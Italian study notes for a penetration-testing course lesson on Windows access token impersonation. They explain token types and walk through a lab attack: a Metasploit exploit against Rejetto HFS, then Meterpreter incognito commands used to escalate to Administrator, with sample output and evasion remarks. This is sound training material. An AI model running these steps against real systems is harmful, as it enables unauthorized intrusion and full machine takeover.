# 010 — Access Token Impersonation (Privilege Escalation)

> **Modulo:** Privilege Escalation · **Video:** 10/19
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [010_ Access Token Impersonation.txt](010_ Access Token Impersonation.txt) · [010_ Access Token Impersonation.srt](010_ Access Token Impersonation.srt)

## Concetti chiave

- Un **Windows access token** è una "chiave temporanea" (paragonabile a un cookie) creata da **LSASS** dopo l'autenticazione, che descrive **identità + privilegi** dell'utente per ogni processo/thread.
- Token generato da **winlogon.exe** al logon → attaccato a **userinit.exe** → ereditato da tutti i child process dell'utente.
- Due **security level** dei token:
  - **Impersonate**: creati in logon **non-interattivi** (service, domain logon). Usabili solo sul **sistema locale**.
  - **Delegate**: creati in logon **interattivi** (console, RDP). Usabili anche su **sistemi remoti** → più pericolosi.
- Prerequisito per l'attacco: **`SeImpersonatePrivilege`** sul nostro account → permette di impersonare token di altri utenti.
- Tool: modulo **incognito** di Meterpreter (`list_tokens -u`, `impersonate_token "<nome>"`).
- Risultato lab: shell come `LOCAL SERVICE` (via exploit Rejetto HFS) → trovato delegation token di `Administrator` → `impersonate_token` → SHELL come Administrator.

## Spiegazione approfondita

### Come funzionano i token

1. User si autentica (RDP, console, network) → LSASS valida le credenziali.
2. winlogon.exe crea l'access token che include: SID utente, gruppi, **privileges list** (le `Se*Privilege`).
3. Token attaccato a `userinit.exe` → ogni processo figlio eredita il token → gira con i privilegi dell'utente.
4. Account di servizio (`LOCAL SERVICE`, `NETWORK SERVICE`, `IIS APPPOOL\..`) spesso hanno **`SeImpersonatePrivilege`** per design → ed è proprio l'ingrediente che apre l'attacco.

### Pre-requisiti exploit

| Requisito | Note |
|---|---|
| `SeImpersonatePrivilege` sul proprio token | Verifica con `whoami /priv` o `getprivs` in meterpreter |
| Almeno un **delegate** o **impersonate** token di un utente privilegiato già presente in memoria | Verifica con `list_tokens -u` |
| Se mancano token target → usare **Juicy Potato / RottenPotato / PrintSpoofer** (video 11) per crearli sfruttando `SeImpersonate` |

### Workflow del lab

1. **Initial access**: nmap → port 80 → Rejetto HFS vulnerabile → exploit Metasploit (`exploit/windows/http/rejetto_hfs_exec`).
2. **Meterpreter session** come `NT AUTHORITY\LOCAL SERVICE`.
3. `getprivs` → conferma `SeImpersonatePrivilege` presente.
4. `load incognito` → estensione meterpreter.
5. `list_tokens -u` → enum dei token disponibili (delegation + impersonation).
6. Trovato delegation token `BUILTIN\Administrators` o `<host>\Administrator`.
7. `impersonate_token "<host>\\Administrator"` (nota: backslash da raddoppiare).
8. `getuid` → ora siamo Administrator. `shell` → `whoami /priv` mostra privilegi elevati.

### Categorizzazione dettagliata

- **Delegate**: full token con tutti i privilegi → spendibile via rete (es. accesso a share su altri host).
- **Impersonate**: token "ridotto" → solo per impersonare in locale, non per accedere a risorse di rete con quelle credenziali.

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `whoami /priv` | Lista privilegi del token corrente |
| `getprivs` (meterpreter) | Equivalente meterpreter |
| `getuid` | Mostra il SID/utente corrente |
| `load incognito` | Carica estensione incognito in meterpreter |
| `list_tokens -u` | Lista token disponibili per **user** |
| `list_tokens -g` | Lista token disponibili per **group** |
| `impersonate_token "DOMAIN\\User"` | Impersona il token (doppio backslash!) |
| `rev2self` | Torna al token originale |
| `migrate <PID>` | Migra in un processo per stabilizzare la sessione |
| `nmap -Pn -n -sS -sV <IP>` | Scan iniziale (nel lab) |
| `use exploit/windows/http/rejetto_hfs_exec` | Modulo iniziale di accesso |

## Esempi pratici

```bash
# 1. Recon + accesso iniziale
nmap -Pn -n -sS -sV 10.10.10.x

msfconsole -q
search rejetto
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.10.10.x
exploit
# → meterpreter come NT AUTHORITY\LOCAL SERVICE
```

```text
# 2. Verifica prerequisiti
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE

meterpreter > getprivs
============================================================
 SeImpersonatePrivilege       <-- ottimo!
 SeAssignPrimaryTokenPrivilege
 SeChangeNotifyPrivilege
...

# 3. Token impersonation
meterpreter > load incognito
meterpreter > list_tokens -u
Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
TARGET\Administrator           <-- target!
TARGET\student

meterpreter > impersonate_token "TARGET\\Administrator"
[+] Delegation token available
[+] Successfully impersonated user TARGET\Administrator

meterpreter > getuid
Server username: TARGET\Administrator

meterpreter > shell
C:\> whoami
target\administrator
C:\> type C:\Users\Administrator\Desktop\flag.txt
```

## Punti d'attenzione per l'esame eCPPT

- **Tre requisiti** da elencare in ordine: (1) `SeImpersonatePrivilege`, (2) token target presente in memoria, (3) tool che faccia l'impersonation (incognito).
- **Account di servizio = jackpot**: `LOCAL SERVICE`, `NETWORK SERVICE`, `IIS APPPOOL\*`, `MSSQLSERVER` hanno `SeImpersonate` di default → "Potato family" funziona quasi sempre.
- **Differenza Delegate vs Impersonate**:
  | Tipo | Logon che lo crea | Usabile per |
  |---|---|---|
  | Delegate | Interactive (console, RDP) | Locale **e** remoto |
  | Impersonate | Non-interactive (service, network) | Solo locale |
- **Sintassi critica**: `impersonate_token "DOMAIN\\User"` — doppio backslash, virgolette obbligatorie.
- **`rev2self`** per tornare indietro — utile se il token target rompe operazioni.
- **Se non ci sono token target → Juicy Potato** (prossimo video) per *crearne* uno SYSTEM sfruttando lo stesso `SeImpersonate`.
- **OPSEC**: l'impersonation è in-memory, non lascia tracce su disco. Event 4624 logon type 9 in alcuni casi.
- Versione standalone "incognito.exe" non più mantenuta — usare la versione meterpreter o `Invoke-TokenManipulation.ps1` (PowerSploit).

## Collegamenti con altri video

- Precedente: [[09_Privilege Escalation via Registry AutoRuns]]
- Prossimo: [[011_Juicy Potato]] — cosa fare quando NON ci sono token privilegiati ma abbiamo `SeImpersonate`.
- `whoami /priv` introdotto in: [[02_Introduction to Privilege Escalation]].
- Privesc via meterpreter post modules: [[03_Privilege Escalation with PowerUp]].
- Famiglia "Potato" (Rotten/Juicy/Print/Rogue/Lonely): cfr. video 11.
